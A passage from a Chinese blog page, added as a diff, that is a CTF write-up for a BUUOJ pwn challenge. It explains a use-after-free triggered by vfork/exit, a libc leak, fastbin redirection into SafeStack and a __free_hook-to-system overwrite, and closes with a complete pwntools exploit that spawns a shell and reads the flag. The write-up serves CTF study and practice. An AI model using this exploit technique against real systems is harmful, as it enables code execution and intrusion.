+</span></span></code></pre></div><p>然后连续 <code>leave()</code> 若干次，让控制流回到合适的位置，再送最终 payload：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;sh;#&#34;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>) <span style="color:#f92672">+</span> p64(libc_base <span style="color:#f92672">+</span> system_off)
+</span></span></code></pre></div><p>此时会把：</p>
+<ul>
+<li><code>__free_hook</code> 改成 <code>system</code></li>
+<li>待 free 的字符串内容开头变成 <code>&quot;sh;#&quot;</code></li>
+</ul>
+<p>于是下一次 free 时就变成：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;sh;#&#34;</span>)
+</span></span></code></pre></div><p>从而起 shell。</p>
+<hr>
+
+<h2 id="十一为什么读-flag-的命令前面要补分号" data-numberify>十一、为什么读 flag 的命令前面要补分号<a class="anchor ms-1" href="#十一为什么读-flag-的命令前面要补分号"></a></h2>
+<p>实际远端 shell 切换后，会吞掉后续输入的第一个字节。</p>
+<p>所以直接发：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat flag
+</span></span></code></pre></div><p>会变成：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>at flag
+</span></span></code></pre></div><p>因此脚本里用的是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;;/bin/cat flag; /bin/cat /flag&#34;</span>
+</span></span></code></pre></div><p>这样即使丢掉第一个字节，也还能正确执行。</p>
+<hr>
+
+<h2 id="十二最终-exp" data-numberify>十二、最终 exp<a class="anchor ms-1" href="#十二最终-exp"></a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>clear(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amd64&#34;</span>, os<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;linux&#34;</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;info&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;node5.buuoj.cn&#34;</span>
+</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">26682</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enter</span>(io, name<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA&#34;</span>):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;iterate&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;name?&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leave</span>(io):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;iterate&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;6&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">trigger_uaf</span>(io):
+</span></span><span style="display:flex;"><span>    enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">4095</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">34</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">61</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">33</span>):
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>recvn(<span style="color:#ae81ff">4095</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;iterate&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    leave(io)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_leak_off <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3C4B78</span>
+</span></span><span style="display:flex;"><span>free_hook_off <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3C67A8</span>
+</span></span><span style="display:flex;"><span>system_off <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x45390</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;name?&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;iterate&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;name?&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">400</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>):
+</span></span><span style="display:flex;"><span>    enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;X&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x51</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>):
+</span></span><span style="display:flex;"><span>    leave(io)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>trigger_uaf(io)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>iter_cnt <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(iter_cnt):
+</span></span><span style="display:flex;"><span>    enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">48</span>)
+</span></span><span style="display:flex;"><span>enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">128</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(iter_cnt <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>    leave(io)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;iterate&#34;</span>)
+</span></span><span style="display:flex;"><span>leak_off <span style="color:#f92672">=</span> leak<span style="color:#f92672">.</span>find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f\x00\x00</span><span style="color:#e6db74">&#34;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&lt;Q&#34;</span>, leak[leak_off:leak_off <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>])[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> libc_leak_off
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>safestack <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x408</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;name?&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(p64(safestack))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">9</span>)
+</span></span><span style="display:flex;"><span>enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">9</span>)
+</span></span><span style="display:flex;"><span>enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">9</span>)
+</span></span><span style="display:flex;"><span>enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">9</span>)
+</span></span><span style="display:flex;"><span>enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;X&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">15</span>)
+</span></span><span style="display:flex;"><span>enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">81</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
+</span></span><span style="display:flex;"><span>    enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;X&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">48</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>enter(io, p64(<span style="color:#ae81ff">0x30</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x30</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>enter(io, p64(<span style="color:#ae81ff">0x30</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x30</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>enter(io, p64(<span style="color:#ae81ff">0x60</span>))
+</span></span><span style="display:flex;"><span>enter(io, p64(<span style="color:#ae81ff">0x21</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;F&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa0</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;iterate&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;name?&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(p64(libc_base <span style="color:#f92672">+</span> free_hook_off <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x30</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leave(io)
+</span></span><span style="display:flex;"><span>leave(io)
+</span></span><span style="display:flex;"><span>leave(io)
+</span></span><span style="display:flex;"><span>leave(io)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Hi, &#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;sh;#&#34;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>) <span style="color:#f92672">+</span> p64(libc_base <span style="color:#f92672">+</span> system_off))
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;8&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;;/bin/cat flag; /bin/cat /flag&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvrepeat(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">rb</span><span style="color:#e6db74">&#34;flag\{[^}]+\}&#34;</span>, data)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> m:
+</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><hr>
+
+<h2 id="十三总结" data-numberify>十三、总结<a class="anchor ms-1" href="#十三总结"></a></h2>
+<p>这题的重点不是传统栈溢出，而是：</p>
+<ul>
+<li><code>vfork()</code> 后错误地走到 <code>exit()</code></li>
+<li>全局 C++ 对象被提前析构</li>
+<li>形成 UAF</li>
+<li>再结合 <code>SafeStack</code> 的固定相对偏移</li>
+<li>最终实现 <code>__free_hook -&gt; system</code></li>
+</ul>
+<p>一句话概括就是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>vfork/exit 导致全局对象 UAF + 堆风水泄漏 libc + 劫持到 SafeStack + __free_hook getshell
+</span></span></code></pre></div></div>
+</div>
+</div></article><div class="post-copyright mb-3 row card component" id="post-copyright">
+    <div class="card-header">
+        <h2 class="card-title fs-4 my-2 text-surface">版权</h2>
+    </div>
+    <div class="card-body">
+
+    </div>
+</div><div class="card component row post-comments" id="post-comments">
+  <div class="card-header">
+    <h2 class="card-title my-2 fs-4 text-surface">评论</h2>
+  </div>
+  <div class="card-body">
+
+
+
+</div>
+</div></div>
+</div>
+<aside class="col-xxl-4 sidebar d-flex">
+  <div class="container d-flex flex-column">
+    
+    
+<div class="accordion profile">
+  <div class="accordion-item card row text-center component">
+    <div class="accordion-header card-header border-0" id="profile-header">
+      <a
+        class="accordion-button d-lg-none mb-2 shadow-none p-0 bg-transparent text-surface"
+        role="button" data-bs-toggle="collapse" href="#profile" aria-expanded="true" aria-controls="profile">
+        Profile
+      </a>
+    </div>
+    <div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id="profile" aria-labelledby="profile-header">
+      <div class="col-12 d-flex align-items-center justify-content-center"><img
+  class="profile-avatar rounded-circle"
+  alt="微风的龙"
+  src="/images/profile.png"
+  loading="lazy"
+  data-viewer-invisible
+></div>
+      <div class="col-12 profile-meta"><div class="profile-name fw-fold fs-lg">微风的龙</div>
+<div class="profile-bio">哈基龙的博客，随便看看</div><div class="profile-location"><i class="fas fa-fw fa-map-marker-alt"></i>China</div><a class="profile-about" target="_blank" rel="noopener noreferrer" href="https://github.com/weifengdel0ng"><i class="fas fa-fw fa-user"></i>关于我</a></div>
+
+
+<nav class="social-links nav justify-content-center mt-1 justify-content-around">
+      <a class="nav-link social-link" target="_blank" href="https://github.com/weifengdel0ng" title="GitHub" rel="me">
+        <i class="fa-fw fa-2x fab fa-github"
+          ></i>
+      </a>
+  <a class="nav-link social-link" target="_blank" data-rss-feed href="https://weifengdel0ng.github.io/buu/%E7%AC%AC%E4%B8%80%E9%A1%B5/harekazectf2019baby_rop2/%E9%99%84%E4%BB%B6/index.xml" title="RSS" rel="me">
+    <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
+  </a>
+</nav>
+</div>
+  </div>
+</div>
+
+
+<div class="accordion taxonomies-toggle">
+    <div class="row card component accordion-item">
+        <div class="accordion-header card-header border-0">
+            <a
+                class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent"
+                role="button" data-bs-toggle="collapse" href="#taxonomies-toggle" aria-expanded="true" aria-controls="taxonomies-toggle">
+                Taxonomies
+            </a>
+        </div>
+        <div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id="taxonomies-toggle">
+            <ul class="nav nav-pills nav-fill" role="tablist">
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link active" id="taxonomyCategoriesTab" data-bs-toggle="tab" data-bs-target="#taxonomyCategories" 
+                            type="button" role="tab" aria-controls="taxonomyCategories" aria-selected="true">
+                            分类
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link" id="taxonomyTagsTab" data-bs-toggle="tab" data-bs-target="#taxonomyTags" 
+                            type="button" role="tab" aria-controls="taxonomyTags" aria-selected="true">
+                            标签
+                        </button>
+                    </li>
+                <li class="nav-item" role="presentation">
+                    <button class="nav-link" id="taxonomyArchivesTab" data-bs-toggle="tab" data-bs-target="#taxonomyArchives" 
+                        type="button" role="tab" aria-controls="taxonomyArchives" aria-selected="true">
+                        归档
+                    </button>
+                </li>
+            </ul>
+            
+            <div class="tab-content mt-3">
+                    <div class="tab-pane active" id="taxonomyCategories" role="tabpanel" aria-labelledby="taxonomyCategoriesTab" tabindex="0">
+                        <a href="/categories/buu/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="BUU">
+                            BUU
+                        </a>
+                        <a href="/categories/%E4%B8%93%E9%A2%98/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="专题">
+                            专题
+                        </a>
+                        <a href="/categories/%E5%BB%BA%E7%AB%99/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="建站">
+                            建站
+                        </a>
+                    </div>
+                    <div class="tab-pane" id="taxonomyTags" role="tabpanel" aria-labelledby="taxonomyTagsTab" tabindex="0">
+                        <a href="/tags/buu/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="BUU">
+                            BUU
+                        </a>
+                        <a href="/tags/blog/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Blog">
+                            Blog
+                        </a>
+                        <a href="/tags/github-pages/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="GitHub Pages">
+                            GitHub Pages
+                        </a>
+                        <a href="/tags/hugo/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Hugo">
+                            Hugo
+                        </a>
+                    </div>
+                <div class="tab-pane" id="taxonomyArchives" role="tabpanel" aria-labelledby="taxonomyArchivesTab" tabindex="0">
+
+    <a href="" class="btn btn-sm btn-secondary post-taxonomy ps-3 me-2 mb-2" title="2026">
+    2026 <span class="badge badge-sm text-secondary bg-white ms-1">2</span>
+    </a>
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+    <div class="accordion posts-toggle">
+      <div class="row card component accordion-item">
+        <div class="accordion-header card-header border-0">
+          <a
+            class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent"
+            role="button"
+            data-bs-toggle="collapse"
+            href="#posts-toggle"
+            aria-expanded="true"
+            aria-controls="posts-toggle">
+            文章
+          </a>
+        </div>
+        <div
+          class="card-body collapse accordion-collapse accordion-body d-lg-block show"
+          id="posts-toggle">
+          <ul class="nav nav-pills nav-fill" role="tablist">
+              <li class="nav-item" role="presentation">
+                <button
+                  class="nav-link active"
+                  id="recent-posts-tab"
+                  data-bs-toggle="tab"
+                  data-bs-target="#recent-posts"
+                  type="button"
+                  role="tab"
+                  aria-controls="recent-posts"
+                  aria-selected="true">
+                  最近文章
+                </button>
+              </li>
+          </ul>
+
+          <div class="tab-content mt-3">
+              <div
+                class="tab-pane active"
+                id="recent-posts"
+                role="tabpanel"
+                aria-labelledby="recent-posts-tab"
+                tabindex="0">
+                <ul class="post-list list-unstyled ms-1">
+                    <li class="mb-2">
+  <div class="d-flex">
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
+      <a class="post-title" href="/posts/hello-hugo/">
+        博客已上线
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          April 27, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+  <div class="d-flex">
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
+      <a class="post-title" href="/posts/buu/">
+        BUU
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          April 27, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                </ul>
+              </div>
+          </div>
+        </div>
+      </div>
+    </div>
+<div class="accordion post-toc d-none d-lg-block">
+  <div class="accordion-item row mb-4 card component" id="postTOC">
+    <div class="card-header accordion-header">
+      <h2 class="card-title fs-4 my-2 text-surface d-none d-lg-block">目录</h2>
+      <a class="accordion-button d-lg-none mb-1 collapsed shadow-none p-0 bg-transparent" role="button" data-bs-toggle="collapse" href="#post-toc" aria-expanded="false" aria-controls="post-toc">
+        目录
+      </a>
+    </div>
+    <div class="card-body collapse accordion-collapse accordion-body d-lg-block" id="post-toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#一程序逻辑">一、程序逻辑</a></li>
+    <li><a href="#二核心漏洞点">二、核心漏洞点</a>
+      <ul>
+        <li><a href="#1-option-3-的危险行为">1. <code>option 3</code> 的危险行为</a></li>
+      </ul>
+    </li>
+    <li><a href="#三为什么可以让-execl-失败">三、为什么可以让 <code>execl</code> 失败</a></li>
+    <li><a href="#四safestack-对利用的影响">四、SafeStack 对利用的影响</a></li>
+    <li><a href="#五利用思路总览">五、利用思路总览</a></li>
+    <li><a href="#六libc-泄漏">六、libc 泄漏</a></li>
+    <li><a href="#七safestack-偏移">七、SafeStack 偏移</a></li>
+    <li><a href="#八堆利用阶段">八、堆利用阶段</a></li>
+    <li><a href="#九把-fastbin-打到-safestack">九、把 fastbin 打到 SafeStack</a></li>
+    <li><a href="#十改写-__free_hook">十、改写 <code>__free_hook</code></a></li>
+    <li><a href="#十一为什么读-flag-的命令前面要补分号">十一、为什么读 flag 的命令前面要补分号</a></li>
+    <li><a href="#十二最终-exp">十二、最终 exp</a></li>
+    <li><a href="#十三总结">十三、总结</a></li>
+  </ul>
+</nav>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+  </div>
+</aside>
+
+      </div>
+    </main><footer class="footer mt-auto py-3 text-center container"><div class="offcanvas offcanvas-bottom h-auto" tabindex="-1" id="offcanvasActionsPanel"
+  aria-labelledby="offcanvasActionsPanelLabel">
+  <div class="offcanvas-header">
+    <div class="offcanvas-title h5" id="offcanvasActionsPanelLabel">
+      <i class="fas fa-fw fa-th-large me-1"></i>
+      操作
+    </div>
+    <button type="button" class="btn-close ms-auto" data-bs-dismiss="offcanvas" data-bs-target="offcanvasActionsPanel" aria-label="Close"></button>
+  </div>
+  <div class="offcanvas-body mt-2"><div class="actions d-flex overflow-auto align-items-center">
+      <a role="button" class="action action-go-back d-flex flex-column align-items-center me-3" href="javascript: window.history.back();">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-90"></i></span> 返回
+      </a>
+      <a role="button" class="action action-reload-page d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-redo-alt"></i></span> 刷新
+      </a>
+      <a role="button" class="action action-copy-url d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-link"></i></span> 复制链接
+      </a>
+    </div>
+  </div>
+</div><div class="row text-center">
+  <div class="col-12 mt-2">
+    <p class="mb-2">微风的龙</p>
+    <p class="text-secondary mb-2"><small>微风的龙的个人博客，记录技术、项目和思考。</small></p><div class="copyright mb-2 text-secondary">
+  <small>
+</small>
+</div>
+<div class="powered-by mb-2 text-secondary">
+  <small>
+    Build with ❤️ from the <a class="text-primary" href="https://gohugo.io" target="_blank" rel="noopener noreferrer">Hugo</a> and the <a class="text-primary" href="https://github.com/razonyang/hugo-theme-bootstrap" target="_blank" rel="noopener noreferrer">HBS</a> theme.
+  </small>
+</div>
+
+
+<nav class="social-links nav justify-content-center mb-2 mt-3">
+  <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" data-rss-feed href="https://weifengdel0ng.github.io/index.xml" title="RSS" rel="me">
+    <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
+  </a>
+</nav>
+</div>
+  <div class="col-12 col-lg-8 offset-0 offset-lg-1"></div>
+</div>
+</footer>
+<script data-precache src="/assets/main/bundle.min.3de74a0b978ed64b15f6e0d25d913177adc77cae61692b679df48c3036ac2c49.js" integrity="sha256-PedKC5eO1ksV9uDSXZExd63HfK5haStnnfSMMDasLEk=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.2afb6643b7cdde837754668abae3dceedc993b71ebefe8bc9c80af3e2e349075.js" integrity="sha256-KvtmQ7fN3oN3VGaKuuPc7tyZO3Hr7&#43;i8nICvPi40kHU=" crossorigin="anonymous" defer></script>
